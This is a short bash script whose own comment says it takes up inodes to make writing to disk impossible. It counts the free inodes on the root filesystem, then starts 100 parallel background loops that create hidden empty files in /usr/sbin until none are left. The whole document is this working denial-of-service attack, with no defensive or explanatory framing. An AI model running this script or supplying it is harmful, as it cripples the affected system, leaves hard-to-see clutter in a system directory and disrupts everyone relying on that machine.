#!/bin/bash
#Takes up inodes - makes it impossible to write to disk

PRFX="/usr/sbin";
FS="/";
freeI=$(df -i "$FS"|awk '{print $4}'|tail -n1);

for i in `seq 1 100`;
	do for q in `seq 1 $((freeI/100))`;
		do touch "$PRFX/.$i.$q";
	done & 
done
